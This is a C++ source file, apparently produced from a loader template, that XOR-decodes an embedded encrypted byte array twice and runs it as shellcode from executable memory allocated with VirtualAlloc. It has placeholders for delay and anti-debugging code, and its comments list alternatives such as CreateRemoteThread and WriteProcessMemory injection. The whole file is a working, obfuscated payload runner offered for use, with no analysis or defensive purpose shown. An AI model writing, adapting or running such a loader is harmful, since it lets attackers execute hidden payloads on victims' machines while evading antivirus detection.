// Bison.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma.
//
#define _CRT_SECURE_NO_WARNINGS
#define MAX_ARGS 100
#define MAX_ARG_LENGTH 255

#include <windows.h>
#include <processenv.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//####USING####

//####DEFINE####

int xor_encode_fb2be2440d7b48ad803c6b26a06f88c6(unsigned char* data, int data_len)
{
    const char* key = "(iMQJBzFq,Vy";
    int key_len = 12;

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }
    return data_len;
}
int xor_encode_167196805a514171a2ad36898a72fa8e(unsigned char* data, int data_len)
{
    const char* key = "5Y6nikbk.0dF";
    int key_len = 12;

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }
    return data_len;
}



DWORD WINAPI PsychoBlast(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0xe1,0x78,0xf8,0xdb,0xd3,0xc1,0xd8,0x2d,0x5f,0x1c,0x73,0x6e,0x5c,0x60,0x29,0x6e,0x75,0x61,0x29,0xff,0x3a,0x54,0xb9,0x6d,0x7d,0x78,0xf0,0x6d,0x3b,0x61,0x93,0x7f,0x7f,0x54,0xb9,0x4d,0x4d,0x78,0x74,0x88,0x69,0x63,0x55,0x1c,0x96,0x54,0x03,0xff,0xb1,0x0c,0x1a,0x43,0x21,0x05,0x38,0x6c,0x9e,0xd5,0x3f,0x7e,0x1c,0xf1,0x99,0xd2,0x71,0x68,0x49,0x65,0xd4,0x4e,0x12,0xb4,0x5f,0x0c,0x33,0x3e,0xf3,0xa2,0x98,0xa5,0x5f,0x1c,0x32,0x77,0x98,0xf0,0x0f,0x58,0x6b,0x28,0xc8,0x7d,0xd4,0x54,0x2a,0x7b,0x96,0x70,0x5b,0x76,0x22,0xf9,0xfb,0x7b,0x17,0xe3,0xfb,0x7e,0x96,0x04,0xf3,0x77,0x22,0xff,0x55,0x1c,0x96,0x54,0x03,0xff,0xb1,0x71,0xba,0xf6,0x2e,0x68,0x19,0xec,0x67,0xfc,0x47,0xce,0x51,0x33,0x37,0x1b,0x2b,0x6c,0x21,0xfc,0x2a,0xc4,0x6a,0x7b,0x96,0x70,0x5f,0x76,0x22,0xf9,0x7e,0x6c,0xd4,0x10,0x7a,0x7b,0x96,0x70,0x67,0x76,0x22,0xf9,0x59,0xa6,0x5b,0x94,0x7a,0x3e,0xcd,0x71,0x23,0x7e,0x7b,0x77,0x41,0x77,0x1e,0x44,0x73,0x66,0x5c,0x6a,0x33,0xbc,0xcf,0x09,0x59,0x7f,0xa0,0xfc,0x6a,0x7e,0x44,0x6a,0x33,0xb4,0x31,0xc0,0x4f,0xd2,0xa0,0xe3,0x6f,0x77,0xa7,0x31,0x7b,0x3f,0x23,0x29,0x18,0x2d,0x5f,0x54,0xbf,0xb2,0x1c,0x31,0x7b,0x3f,0x62,0x93,0x29,0xa6,0x30,0x9b,0xcd,0xea,0xa6,0xc0,0xce,0x9d,0x75,0x68,0xa2,0x8b,0xca,0xa1,0xaf,0xc0,0xc8,0x78,0xf8,0xfb,0x0b,0x15,0x1e,0x51,0x55,0x9c,0xc9,0xdf,0x68,0x35,0xc0,0x78,0x30,0x5b,0x77,0x47,0x5f,0x45,0x73,0xb6,0xc7,0xcf,0xae,0x5c,0x42,0x45,0x7b,0x03,0x3a,0x64,0x57,0x3f};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = xor_encode_fb2be2440d7b48ad803c6b26a06f88c6(encoded, length);length = xor_encode_167196805a514171a2ad36898a72fa8e(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    
    // Method 1: No process Specified 
    VOID* mem = VirtualAlloc(NULL, length, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);

    // Method 2: Specifying current process 
    //VOID* mem = VirtualAllocEx(currentProcess, NULL, length + 1, 0x00002000 | 0x00001000, PAGE_READWRITE);
    if (mem == NULL)
        return -1;
    //VirtualProtect(mem, length, 0x40, &dwSize);

    bool success = false;
    // Method 1: No process Specified

    success = memcpy(mem, decoded, length);

    // Method 2: Specifying current process 
    // success = WriteProcessMemory(currentProcess, mem, decoded, length, &bytesWritten);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    // Method 1: No process Specified, using function pointer
    //int (*my_main)(char**) = (int(*)(char**)) ((ULONGLONG)mem);
    // With no params, this definition would be good as well
    ((void(*)())mem)();

    //char** args = (char**)lpParameter;

    //ret_val = my_main(args);
    //free(args);

    // Method 2: No process specified, using CreateThread
    //CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);

    // Method 3: Specifying current process
    //CreateRemoteThread(currentProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, lpParameter, 0, NULL);

    /* Method 4: Using Assembly to manipulate return address
    * 1. MOV &mem RCX ---> Store mem on RCX
    * 2. PUSH RCX     ---> Push mem on the stack
    * 3. RET          ---> mem is now in RIP, and gets executed
    asm volatile ("mov %0, %%rcx\n\t"
        "push %%rcx\n\t"
        "ret"
        :
    : "r" (mem));
    */
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    PsychoBlast(NULL);
}
